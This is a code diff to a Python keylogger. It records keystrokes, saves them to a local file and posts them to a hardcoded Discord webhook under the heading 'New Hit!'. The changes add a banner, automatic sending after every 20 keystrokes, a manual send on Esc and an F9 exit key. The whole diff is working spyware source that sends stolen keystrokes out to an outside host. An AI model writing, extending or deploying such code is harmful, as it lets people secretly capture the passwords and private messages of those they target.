@@ -9,9 +9,18 @@ import requests
 
 words = []
 caps_lock = False
+art = r'''
+___________       __                  .____                                      
+\_   _____/ _____/  |_  _________.__. |    |    ____   ____   ____   ___________ 
+ |    __)__/ ___\   __\/  ___<   |  | |    |   /  _ \ / ___\ / ___\_/ __ \_  __ |
+ |        \  \___|  |  \___ \ \___  | |    |__(  <_> ) /_/  > /_/  >  ___/|  | \/
+/_______  /\___  >__| /____  >/ ____| |_______ \____/\___  /\___  / \___  >__|   
+        \/     \/          \/ \/              \/    /_____//_____/      \/       
+'''
 
-print(Fore.GREEN + 'Welcome to the Keylogger!')
+print(Fore.GREEN + art)
 time.sleep(0.5)
+print('\n')
 
 def get_status():
     return input(Fore.GREEN + 'Enter 0 to proceed with default config / 1 to use interval-based logging > ').strip()
@@ -21,7 +30,7 @@ status = get_status()
 if status != '1' and status != '0':
     print(Fore.RED + 'Please enter a valid response')
     status = get_status()
-print(Fore.BLUE + "Keylogging Began, hit 'Esc' to exit")
+print(Fore.BLUE + "Keylogging Began, hit 'f9' to exit. 'Esc' to toggle a manual log")
 
 t = time.time()
 current_time = ctime(t)
@@ -31,6 +40,7 @@ current_time = ctime(t)
 def click_0(key):
     global words, caps_lock, content
 
+    start_time = time.time()
     char = ''
     if key == Key.space:
         words.append(' ')  
@@ -49,15 +59,22 @@ def click_0(key):
     elif key == Key.enter:
         if words:
             words += '\n'
-    
 
-    elif key == Key.esc:
-        print('Logs written to logs.txt!') 
+    elif len(words) >= 20:
+        print('logs written to localfile // logs sent to webhook')
         write_file(words)
-        time.sleep(0.2) 
-        print('Logs sent to webhook!')
         time.sleep(0.3)
+        words =[]
+
+# manual log, every time 'esc' is clicked there will be logs
+    elif key == Key.esc:
+        print('logs written to localfile // logs sent to webhook')
+        write_file(words)
+        words = []
+
+    elif key == Key.f9:
         print('exiting...')
+        time.sleep(1)
         exit()
     
     else:
@@ -122,10 +139,10 @@ def write_file(words):
     time.sleep(1)
 
     with open('logs.txt', 'r') as f:
-        content = f.read()
+        content = ("`" + f.read() + "`").strip()
         webhook_url = "https://discord.com/api/webhooks/1249777345796247593/If_oyH2HtDdeuIULk8A17-IE_HHfovHgaB_ic3Wzi1ublagruEPUJGtPTEsV36srmgdS"
     webhook = DiscordWebhook(url=webhook_url)
-    embed = DiscordEmbed(title="New Hit!", description= f'{content}' '\n' + '\n' + f'logged at {current_time}', color="03b2f8")
+    embed = DiscordEmbed(title="New Hit!", description= f' {content} ' '\n' + '\n' + f'logged at {current_time}', color="03b2f8")
     webhook.add_embed(embed)
     response = webhook.execute()
 
